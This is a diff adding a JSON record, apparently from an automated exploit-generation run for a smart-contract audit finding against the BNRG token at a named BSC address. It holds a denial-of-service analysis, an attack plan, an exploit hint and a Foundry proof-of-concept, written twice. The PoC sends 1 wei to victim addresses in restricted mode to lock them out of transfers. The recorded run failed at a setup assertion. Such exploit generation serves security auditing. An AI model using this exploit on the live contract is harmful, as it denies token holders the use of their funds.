@@ -1,0 +1,66 @@
+{
+  "project_id": "Binamon_Energy_Smart_Contract_Audit_Report_-_QuillAudits",
+  "target_address": "0xd8813B5Dfa9AbEB693F217Bb905ec99B66FB017C",
+  "finding_id": 0,
+  "status": "FAILED",
+  "violation_target": {
+    "target_address": "0xd8813B5Dfa9AbEB693F217Bb905ec99B66FB017C",
+    "vulnerability_type": "Denial of Service via Restricted Mode",
+    "violation_category": "LOGIC",
+    "finding_id": 0,
+    "preconditions": [
+      {
+        "type": "state",
+        "description": "Contract must be in Restricted state (bot protection enabled)",
+        "token_address": null,
+        "min_amount": null
+      },
+      {
+        "type": "token_balance",
+        "description": "Attacker must have at least 1 wei of BNRG tokens to initiate a transfer",
+        "token_address": "0xd8813B5Dfa9AbEB693F217Bb905ec99B66FB017C",
+        "min_amount": "1"
+      }
+    ],
+    "oracle_verification": {
+      "economic_check": null,
+      "logic_check": {
+        "target_variable": "lastTx[attacker_address]",
+        "operator": ">",
+        "expected_value": "0"
+      }
+    },
+    "exploit_hint": "When contract is in Restricted state, the launchRestrict modifier updates lastTx for both sender and recipient to block.timestamp. By transferring 1 wei to a victim address, you can set their lastTx to current timestamp, preventing them from making transactions for 60 seconds. Repeatedly transfer small amounts to different victim addresses to lock multiple users out of transactions."
+  },
+  "final_poc_code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.0;\n\nimport \"forge-std/Test.sol\";\n\ninterface IBNRG {\n    function totalSupply() external view returns (uint256);\n    function balanceOf(address account) external view returns (uint256);\n    function transfer(address recipient, uint256 amount) external returns (bool);\n    function allowance(address owner, address spender) external view returns (uint256);\n    function approve(address spender, uint256 amount) external returns (bool);\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\n    function owner() external view returns (address);\n    function setBotProtection(bool enable) external;\n    function state() external view returns (uint8);\n    function mint(uint256 numTokens) external returns(bool);\n    function burn(uint256 numTokens) external returns(bool);\n    function setRestrictionAmount(uint256 amount) external;\n    function blacklistAccount(address account, bool ban) external;\n}\n\ncontract ExploitTest is Test {\n    // ─── State Variables ─────────────────────────────────────\n    address constant TARGET = 0xd8813B5Dfa9AbEB693F217Bb905ec99B66FB017C;\n    address attacker = address(this);\n    IBNRG bnrgtoken;\n\n    // ─── Setup ───────────────────────────────────────────────\n    function setUp() public {\n        // Create interface for BNRG\n        bnrgtoken = IBNRG(TARGET);\n        \n        // Get owner address\n        address owner = bnrgtoken.owner();\n        \n        // Impersonate owner to enable bot protection\n        vm.startPrank(owner);\n        bnrgtoken.setBotProtection(true);\n        vm.stopPrank();\n        \n        // Verify contract is in Restricted state\n        assertEq(uint256(bnrgtoken.state()), 1); // 0=Locked, 1=Restricted, 2=Unlocked\n        \n        // Give attacker some BNRG tokens\n        // We need to manipulate the balance mapping directly since there's no mint function for non-owner\n        // The owner has all tokens initially, so we'll transfer from owner to attacker\n        vm.prank(owner);\n        bnrgtoken.transfer(attacker, 1000 * 10**18);\n    }\n\n    // ─── Exploit ─────────────────────────────────────────────\n    function testExploit() public {\n        // Get owner address\n        address owner = bnrgtoken.owner();\n\n        // Create victim addresses\n        address victim1 = makeAddr(\"victim1\");\n        address victim2 = makeAddr(\"victim2\");\n        address victim3 = makeAddr(\"victim3\");\n        \n        // Transfer 1 wei to each victim to set their lastTx\n        bnrgtoken.transfer(victim1, 1);\n        bnrgtoken.transfer(victim2, 1);\n        bnrgtoken.transfer(victim3, 1);\n        \n        // Now victims should be locked out for 60 seconds\n        // Try to make a transfer from victim1 (should revert)\n        // First give victim1 some tokens to transfer\n        vm.prank(owner);\n        bnrgtoken.transfer(victim1, 100 * 10**18);\n        \n        // Now try to transfer from victim1 - should revert due to lastTx check\n        vm.prank(victim1);\n        vm.expectRevert(\"BMON: only one tx/min in restricted mode\");\n        bnrgtoken.transfer(victim2, 1);\n        \n        // Also verify attacker's lastTx[attacker] > 0 as per oracle requirement\n        // We can check this by trying to make another transfer from attacker immediately\n        // It should also revert\n        vm.expectRevert(\"BMON: only one tx/min in restricted mode\");\n        bnrgtoken.transfer(victim1, 1);\n    }\n\n    // ─── Receive ETH ─────────────────────────────────────────\n    receive() external payable {}\n}",
+  "attempts": [
+    {
+      "attempt_number": 1,
+      "vulnerability_analysis": "The vulnerability exists in the launchRestrict modifier when state == State.Restricted. It updates lastTx for both sender and recipient to block.timestamp, then requires that lastTx[sender].add(60) <= block.timestamp and lastTx[recipient].add(60) <= block.timestamp. This means after a transfer, both parties cannot make another transaction for 60 seconds. An attacker can exploit this by sending tiny amounts (1 wei) to multiple victim addresses, locking each victim out of transactions for 60 seconds. Since the attacker controls when to send, they can continuously lock victims out, creating a DoS.",
+      "attack_strategy": "1. Impersonate the owner to enable bot protection (set state to Restricted). 2. Get some BNRG tokens to the attacker address. 3. Create multiple victim addresses. 4. Transfer 1 wei of BNRG to each victim address, which will set their lastTx to current timestamp. 5. Verify that victims cannot transfer tokens for 60 seconds by attempting a transfer that should revert.",
+      "step_by_step_plan": "1. Use vm.prank to impersonate the owner and call setBotProtection(true) to enable Restricted mode. 2. Use deal() to give attacker BNRG tokens (need to find the correct storage slot for balances). 3. Create victim addresses using makeAddr(). 4. For each victim, transfer 1 wei of BNRG to them. 5. Immediately try to make a transfer from victim address (should revert due to lastTx check). 6. Use assert to verify the revert occurs.",
+      "failure_reflection": "",
+      "action": "write_poc",
+      "tool_calls": [],
+      "poc_code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.0;\n\nimport \"forge-std/Test.sol\";\n\ninterface IBNRG {\n    function totalSupply() external view returns (uint256);\n    function balanceOf(address account) external view returns (uint256);\n    function transfer(address recipient, uint256 amount) external returns (bool);\n    function allowance(address owner, address spender) external view returns (uint256);\n    function approve(address spender, uint256 amount) external returns (bool);\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\n    function owner() external view returns (address);\n    function setBotProtection(bool enable) external;\n    function state() external view returns (uint8);\n    function mint(uint256 numTokens) external returns(bool);\n    function burn(uint256 numTokens) external returns(bool);\n    function setRestrictionAmount(uint256 amount) external;\n    function blacklistAccount(address account, bool ban) external;\n}\n\ncontract ExploitTest is Test {\n    // ─── State Variables ─────────────────────────────────────\n    address constant TARGET = 0xd8813B5Dfa9AbEB693F217Bb905ec99B66FB017C;\n    address attacker = address(this);\n    IBNRG bnrgtoken;\n\n    // ─── Setup ───────────────────────────────────────────────\n    function setUp() public {\n        // Create interface for BNRG\n        bnrgtoken = IBNRG(TARGET);\n        \n        // Get owner address\n        address owner = bnrgtoken.owner();\n        \n        // Impersonate owner to enable bot protection\n        vm.startPrank(owner);\n        bnrgtoken.setBotProtection(true);\n        vm.stopPrank();\n        \n        // Verify contract is in Restricted state\n        assertEq(uint256(bnrgtoken.state()), 1); // 0=Locked, 1=Restricted, 2=Unlocked\n        \n        // Give attacker some BNRG tokens\n        // We need to manipulate the balance mapping directly since there's no mint function for non-owner\n        // The owner has all tokens initially, so we'll transfer from owner to attacker\n        vm.prank(owner);\n        bnrgtoken.transfer(attacker, 1000 * 10**18);\n    }\n\n    // ─── Exploit ─────────────────────────────────────────────\n    function testExploit() public {\n        // Get owner address\n        address owner = bnrgtoken.owner();\n\n        // Create victim addresses\n        address victim1 = makeAddr(\"victim1\");\n        address victim2 = makeAddr(\"victim2\");\n        address victim3 = makeAddr(\"victim3\");\n        \n        // Transfer 1 wei to each victim to set their lastTx\n        bnrgtoken.transfer(victim1, 1);\n        bnrgtoken.transfer(victim2, 1);\n        bnrgtoken.transfer(victim3, 1);\n        \n        // Now victims should be locked out for 60 seconds\n        // Try to make a transfer from victim1 (should revert)\n        // First give victim1 some tokens to transfer\n        vm.prank(owner);\n        bnrgtoken.transfer(victim1, 100 * 10**18);\n        \n        // Now try to transfer from victim1 - should revert due to lastTx check\n        vm.prank(victim1);\n        vm.expectRevert(\"BMON: only one tx/min in restricted mode\");\n        bnrgtoken.transfer(victim2, 1);\n        \n        // Also verify attacker's lastTx[attacker] > 0 as per oracle requirement\n        // We can check this by trying to make another transfer from attacker immediately\n        // It should also revert\n        vm.expectRevert(\"BMON: only one tx/min in restricted mode\");\n        bnrgtoken.transfer(victim1, 1);\n    }\n\n    // ─── Receive ETH ─────────────────────────────────────────\n    receive() external payable {}\n}",
+      "exit_code": 1,
+      "error": {
+        "error_type": "ASSERTION_FAILED",
+        "reason": "Assertion failed (no specific reason extracted)",
+        "location": null,
+        "raw_snippet": "...ed to read cache file err=Os { code: 2, kind: NotFound, message: \"No such file or directory\" } path=\"<FOUNDRY_HOME>/cache/rpc/bsc/87059659\"\n\nRan 1 test for test/Exploit.t.sol:ExploitTest\n[FAIL: assertion failed: 2 != 1] setUp() (gas: 0)\n2026-03-17T05:11:03.060381Z  WARN traces::etherscan: could not get etherscan info: ContractCodeNotVerified(0x7109709ecfa91a80626ff3989d68f67f5b1dd12d)\n2026-0..."
+      },
+      "feedback": "执行未回滚，但断言失败：Assertion failed (no specific reason extracted)。请检查攻击逻辑是否完整，或计算的参数是否正确。",
+      "duration_seconds": 56.82166910171509,
+      "prompt_tokens": 7303,
+      "completion_tokens": 2109,
+      "total_cost": 0.0
+    }
+  ],
+  "total_attempts": 1,
+  "error_message": null,
+  "total_duration_seconds": 56.823883056640625,
+  "total_prompt_tokens": 7303,
+  "total_completion_tokens": 2109,
+  "total_cost": 0.0
+}
